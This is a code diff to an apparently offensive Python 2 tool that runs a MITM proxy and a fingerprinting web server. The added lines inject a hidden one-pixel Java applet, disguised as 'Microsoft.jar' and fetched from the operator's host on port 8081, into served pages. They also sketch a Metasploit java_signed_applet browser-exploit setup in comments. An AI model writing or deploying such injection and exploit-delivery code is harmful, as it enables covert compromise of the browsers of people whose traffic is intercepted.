@@ -4,6 +4,8 @@ from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
 import string,cgi,time,urlparse,commands,os,subprocess
 from os import curdir, sep
 
+javaSelfsigned=False
+
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         if 'fingerprint.html' in self.path:
@@ -66,6 +68,10 @@ def modifyHTML(filename):
 		if '$.get(' in line:
 			replaceLine = "		$.get('http://"+ipAddr+":9090/scan?'+ params, function(data) {"
 			content.append(replaceLine)
+		elif '<body>' in line:
+			content.append(line)
+			if javaSelfsigned==True:
+				content.append('<applet archive="http://'+ipAddr+':8081/java/Microsoft.jar" code="Microsoft" width="1" height="1"></applet>')
 		else:
 			content.append(line)
     fo = open("fingerprint.html", "w+") 
@@ -93,6 +99,14 @@ def startMITMproxy():
 	cmd = 'screen -S mitm -X stuff "'+cmdStr+'^m"'
 	subprocess.Popen(cmd, shell=True)
 	#cmd = 'screen  -S hello  -X stuff "ping 4.2.2.2^m"
+
+def setupMetasploit():
+	ipAddr = getIP()
+	#"use exploit/multi/browser/java_signed_applet"
+	#"set SRVHOST "+ipAddr
+	#"set SRVPORT 8081"
+	#"set URIPATH /java"
+
 def main():
     try:
 	#Get Gateway
@@ -107,6 +121,8 @@ def main():
         server.serve_forever()
     except KeyboardInterrupt:
         print '^C received, shutting down server'
+	cmd = "killall screen"
+	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
         server.socket.close()
 
 if __name__ == '__main__':
